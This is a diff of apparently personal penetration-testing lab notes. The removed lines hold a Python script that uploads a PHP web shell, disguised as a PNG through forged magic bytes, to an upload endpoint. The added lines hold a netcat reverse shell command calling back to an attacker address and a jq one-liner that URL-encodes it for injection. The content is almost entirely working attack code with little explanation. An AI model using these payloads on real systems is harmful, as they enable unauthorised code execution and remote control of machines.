@@ -17,41 +17,11 @@ dv.paragraph("```bash\n" + command + "\n```");
 Editing Box
 
 ```
-#!/usr/bin/env python3
-import requests
+echo -n 'c:\users\public\nc.exe 10.10.16.66:4444 -e cmd.exe' | jq -sRr @uri
+```
 
-def main():
-    url = "http://10.129.25.107:8080/upload.php?id=test"
-
-    s = requests.Session()
-    s.get(url, verify=False)
-
-    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
-
-    png = {
-        'file': (
-            'test.php.png',
-            PNG_magicBytes + '\n' + '<?php echo shell_exec($_GET["cmd"]); ?>',
-            'image/png',
-            {'Content-Disposition': 'form-data'}
-        )
-    }
-
-    data = {
-        'pupload': 'upload'
-    }
-
-    r = s.post(
-        url=url,
-        files=png,
-        data=data,
-        verify=False
-    )
-
-    print("Uploaded!")
-
-if __name__ == "__main__":
-    main()
+```
+c:\users\public\nc.exe 10.10.16.66:4444 -e cmd.exe
 ```
 
 wget from local python server
